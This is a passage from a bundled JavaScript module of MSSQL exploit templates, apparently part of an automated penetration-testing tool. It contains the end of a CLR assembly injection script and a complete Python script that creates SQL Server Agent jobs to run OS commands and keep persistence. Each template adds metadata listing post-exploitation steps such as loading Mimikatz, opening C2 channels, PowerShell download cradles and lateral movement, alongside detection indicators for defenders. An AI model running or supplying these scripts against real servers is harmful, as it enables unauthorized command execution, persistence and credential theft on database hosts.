        # 2. Convert to hex: SELECT CONVERT(VARCHAR(MAX), BulkColumn, 2) FROM OPENROWSET(...)
        # 3. Pass the hex string to create_assembly()
        
        print("[*] CLR assembly attack vector confirmed available")
        print(f"[*] Target is vulnerable to CLR assembly injection")
        print(f"[PROOF] MSSQL CLR integration exploitable on {target}")

        elapsed = time.time() - start
        print(f"[+] CLR assessment completed in {elapsed:.2f}s")
        conn.close()
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
`,
      prerequisites: [
        "Sysadmin access on MSSQL server",
        "CLR integration can be enabled",
        "TRUSTWORTHY can be set on the database",
        "Pre-compiled .NET assembly (C# command executor)"
      ],
      usage: "python3 mssql_clr_assembly.py <target_ip> <port> <username> <password> <command>",
      expectedOutcome: "Custom .NET code execution within MSSQL process, providing full OS access through CLR stored procedures",
      opsecRisk: 9,
      detectionIndicators: [
        "CLR configuration changes in SQL audit",
        "TRUSTWORTHY database property change",
        "Assembly creation events",
        "Unusual .NET code execution from sqlservr.exe",
        "CREATE ASSEMBLY statements in query logs"
      ],
      verificationSteps: [
        "Confirm CLR is enabled",
        "Verify TRUSTWORTHY is set",
        "Test assembly creation (or confirm vulnerability)",
        "Execute command through CLR procedure"
      ],
      targetPorts: [1433, 1434],
      confidence: 75,
      requiredPrivilege: "sysadmin",
      postExploitActions: [
        "Execute arbitrary .NET code for advanced post-exploitation",
        "Use .NET for network operations (port scanning, pivoting)",
        "Load Mimikatz or other tools via CLR",
        "Establish C2 channel through CLR assembly"
      ]
    };
    MSSQL_AGENT_JOB_TEMPLATE = {
      id: "MSSQL-EXP-007",
      name: "MSSQL Agent Job Persistence & Command Execution",
      description: "Creates SQL Server Agent jobs for persistence and command execution. Agent jobs run under the SQL Server Agent service account (often LocalSystem or a domain service account) and can execute OS commands, PowerShell, SSIS packages, and T-SQL. Jobs can be scheduled for persistence or executed immediately for on-demand command execution.",
      category: "agent_job",
      mitreTechniqueIds: ["T1053.005", "T1059.003", "T1505.001"],
      language: "python",
      code: `#!/usr/bin/env python3
"""
MSSQL Agent Job Abuse \u2014 Authorized Penetration Testing Only
Targets: MSSQL servers with sysadmin access and SQL Agent running
MITRE: T1053.005, T1059.003, T1505.001
"""
import pymssql
import sys
import time
import uuid

def check_agent_status(conn):
    """Check if SQL Server Agent is running."""
    cursor = conn.cursor()
    try:
        cursor.execute(
            "EXEC xp_servicecontrol 'querystate', 'SQLServerAgent'"
        )
        row = cursor.fetchone()
        return row and "Running" in str(row[0])
    except:
        return None  # Can't determine

def create_agent_job(conn, job_name, command, step_type="CmdExec"):
    """Create a SQL Agent job with a command execution step."""
    cursor = conn.cursor()
    job_id = str(uuid.uuid4()).upper()
    
    try:
        # Create the job
        cursor.execute(f"""
            EXEC msdb.dbo.sp_add_job 
                @job_name = N'{job_name}',
                @enabled = 1,
                @description = N'Authorized penetration test job',
                @owner_login_name = N'sa'
        """)
        conn.commit()
        
        # Add job step
        subsystem = "CmdExec" if step_type == "CmdExec" else "PowerShell"
        cursor.execute(f"""
            EXEC msdb.dbo.sp_add_jobstep
                @job_name = N'{job_name}',
                @step_name = N'ExecStep',
                @subsystem = N'{subsystem}',
                @command = N'{command}',
                @retry_attempts = 0,
                @retry_interval = 0
        """)
        conn.commit()
        
        # Add to local server
        cursor.execute(f"""
            EXEC msdb.dbo.sp_add_jobserver
                @job_name = N'{job_name}',
                @server_name = N'(LOCAL)'
        """)
        conn.commit()
        
        return True, job_name
    except Exception as e:
        return False, str(e)

def execute_job(conn, job_name):
    """Execute a SQL Agent job immediately."""
    cursor = conn.cursor()
    try:
        cursor.execute(f"EXEC msdb.dbo.sp_start_job @job_name = N'{job_name}'")
        conn.commit()
        return True
    except Exception as e:
        return False

def add_schedule(conn, job_name, freq="daily"):
    """Add a schedule to a job for persistence."""
    cursor = conn.cursor()
    try:
        cursor.execute(f"""
            EXEC msdb.dbo.sp_add_jobschedule
                @job_name = N'{job_name}',
                @name = N'PersistSchedule',
                @freq_type = 4,
                @freq_interval = 1,
                @active_start_time = 010000
        """)
        conn.commit()
        return True
    except:
        return False

def cleanup_job(conn, job_name):
    """Remove the agent job (cleanup after testing)."""
    cursor = conn.cursor()
    try:
        cursor.execute(f"EXEC msdb.dbo.sp_delete_job @job_name = N'{job_name}'")
        conn.commit()
        return True
    except:
        return False

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1433
    user = sys.argv[3] if len(sys.argv) > 3 else "sa"
    password = sys.argv[4] if len(sys.argv) > 4 else "PASSWORD"
    command = sys.argv[5] if len(sys.argv) > 5 else "whoami > C:\\\\temp\\\\agent_proof.txt"

    print(f"[*] MSSQL Agent Job Abuse: {target}:{port}")
    start = time.time()

    try:
        conn = pymssql.connect(
            server=target, port=port, user=user, password=password,
            login_timeout=10, timeout=30
        )
        print("[+] Connected successfully")

        # Check Agent status
        agent_running = check_agent_status(conn)
        if agent_running:
            print("[+] SQL Server Agent is running")
        elif agent_running is None:
            print("[*] Could not determine Agent status")
        else:
            print("[-] SQL Server Agent is not running")
            return

        # Create job
        job_name = f"PenTest_{uuid.uuid4().hex[:8]}"
        print(f"[*] Creating Agent job: {job_name}")
        ok, msg = create_agent_job(conn, job_name, command)
        if ok:
            print(f"[+] Job created: {msg}")
            print(f"[PROOF] SQL Agent job created for command execution")
        else:
            print(f"[-] Job creation failed: {msg}")
            return

        # Execute immediately
        print("[*] Executing job...")
        if execute_job(conn, job_name):
            print("[+] Job started successfully")
            print(f"[PROOF] Command executed via SQL Agent: {command}")
            time.sleep(3)  # Wait for execution
        
        # Show persistence capability
        print("[*] Persistence: Job can be scheduled for recurring execution")
        print("[PROOF] SQL Agent job persistence vector confirmed")

        # Cleanup
        print(f"[*] Cleaning up job: {job_name}")
        cleanup_job(conn, job_name)
        print("[+] Job removed")

        elapsed = time.time() - start
        print(f"[+] Agent job abuse completed in {elapsed:.2f}s")
        conn.close()
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
`,
      prerequisites: [
        "Sysadmin access on MSSQL server",
        "SQL Server Agent service running",
        "Network access to MSSQL port (1433/1434)",
        "pymssql Python library installed"
      ],
      usage: "python3 mssql_agent_job.py <target_ip> <port> <username> <password> <command>",
      expectedOutcome: "Command execution via SQL Agent job with persistence capability through scheduled job execution",
      opsecRisk: 6,
      detectionIndicators: [
        "sp_add_job/sp_add_jobstep calls in SQL audit",
        "New SQL Agent job creation events",
        "Job execution under Agent service account",
        "Unusual process creation from SQLAgent.exe",
        "msdb.dbo.sysjobs table modifications"
      ],
      verificationSteps: [
        "Confirm SQL Agent is running",
        "Verify job creation succeeded",
        "Check command output file exists",
        "Test scheduled execution for persistence"
      ],
      targetPorts: [1433, 1434],
      confidence: 85,
      requiredPrivilege: "sysadmin",
      postExploitActions: [
        "Schedule recurring jobs for persistence",
        "Execute PowerShell download cradles via Agent",
        "Use Agent for lateral movement to other servers",
        "Create SSIS package jobs for advanced payloads"
      ]
    };
    MSSQL_EXPLOIT_TEMPLATES = [
      MSSQL_XP_CMDSHELL_TEMPLATE,
      MSSQL_LINKED_SERVER_TEMPLATE,
      MSSQL_IMPACKET_TEMPLATE,
      MSSQL_CREDENTIAL_EXTRACT_TEMPLATE,
      MSSQL_OLE_AUTOMATION_TEMPLATE,
      MSSQL_CLR_ASSEMBLY_TEMPLATE,
      MSSQL_AGENT_JOB_TEMPLATE
    ];
  }
});

export {
  MSSQL_EXPLOIT_TEMPLATES,
  getMssqlExploitsByCategory,
  selectMssqlExploit,
  getMssqlMitreTechniques,
  buildMssqlExploitContext,
  init_mssql_exploit_module
};
